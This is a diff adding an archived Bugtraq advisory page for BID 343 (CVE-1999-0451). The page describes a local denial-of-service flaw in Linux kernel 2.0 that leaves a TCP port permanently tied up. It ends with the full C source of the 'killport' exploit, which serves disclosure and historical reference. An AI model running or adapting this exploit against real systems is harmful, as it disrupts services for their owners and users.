@@ -1,0 +1,102 @@
+#bid343<p><b><span style="font-size: 18pt;">Linux TCP Port DoS Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/343/info">info</a><br><a href="http://www.securityfocus.com/bid/343/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/343/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/343/solution">solution</a><br><a href="http://www.securityfocus.com/bid/343/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				343
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Unknown
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-1999-0451<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jan 19 1999 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 11 2009 12:16AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				First posted to BugTraq by David Schwartz &lt;davids@WEBMASTER.COM&gt; on January 19, 1999.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Linux kernel 2.0 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					Linux kernel 2.2 <br/>
+					
+				
+					Linux kernel 2.1 <br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	 Below is a harmless example of the exploit:<br/><br/> // This program will kill a random port on a linux machine. The kernel will<br/><br/> // forever listen to that port and send the connections nowhere. Tested with<br/><br/> // Linux kernel 2.0.35 and libc-2.0.7. Requires LinuxThreads to compile,<br/><br/> // but removing LinuxThreads from your system will not solve the problem.<br/><br/> // Discovered by David J. Schwartz &amp;lt;davids@webmaster.com&amp;gt;<br/><br/> // Copyright (C) 1998, David J. Schwartz<br/><br/> // Compile with:<br/><br/> // gcc killport.c -lpthread -o killport<br/><br/> #include &amp;lt;pthread.h&amp;gt;<br/><br/> #include &amp;lt;stdio.h&amp;gt;<br/><br/> #include &amp;lt;sys/types.h&amp;gt;<br/><br/> #include &amp;lt;sys/socket.h&amp;gt;<br/><br/> #include &amp;lt;netinet/in.h&amp;gt;<br/><br/> #include &amp;lt;stdlib.h&amp;gt;<br/><br/> #include &amp;lt;arpa/inet.h&amp;gt;<br/><br/> #include &amp;lt;errno.h&amp;gt;<br/><br/> volatile int s;<br/><br/> void *Thread1(void *a)<br/><br/> {<br/><br/> int i,p;<br/><br/> struct sockaddr_in to;<br/><br/> fd_set fd;<br/><br/> s=socket(AF_INET, SOCK_STREAM, 0);<br/><br/> if(s&amp;lt;=0) return;<br/><br/> memset(&amp;amp;to, 0, sizeof(to));<br/><br/> srand(getpid());<br/><br/> /* we pick a random port between 50000 and 59999 */<br/><br/> p=(rand()%10000)+50000;<br/><br/> printf("port = %d\n", p);<br/><br/> fflush(stdout);<br/><br/> to.sin_port=htons(p);<br/><br/> to.sin_addr.s_addr=0;<br/><br/> to.sin_family=AF_INET;<br/><br/> if(bind(s, (struct sockaddr *)&amp;amp;to, sizeof(to))&amp;lt;0) fprintf(stderr,"no bind\n");<br/><br/> if(listen(s,10)!=0)<br/><br/> fprintf(stderr,"No Listen\n");<br/><br/> /* now we are listening on that port */<br/><br/> i=sizeof(to);<br/><br/> FD_ZERO(&amp;amp;fd);<br/><br/> FD_SET(s,&amp;amp;fd);<br/><br/> select(s+1,&amp;amp;fd,NULL,NULL,NULL);<br/><br/> /* at this point we have selected on it as well */<br/><br/> fprintf(stderr,"select returned!\n");<br/><br/> }<br/><br/> void *Thread2(void *a)<br/><br/> {<br/><br/> close(s);<br/><br/> fflush(stderr);<br/><br/> abort();<br/><br/> }<br/><br/> void main(void)<br/><br/> {<br/><br/> pthread_t j;<br/><br/> pthread_create(&amp;amp;j,NULL,Thread1,NULL);<br/><br/> usleep(100); /* give the other thread time to finish */<br/><br/> pthread_create(&amp;amp;j,NULL,Thread2,NULL);<br/><br/> while(1) sleep(1);<br/><br/> }
+	
+		<ul>
+</ul>
+</div>
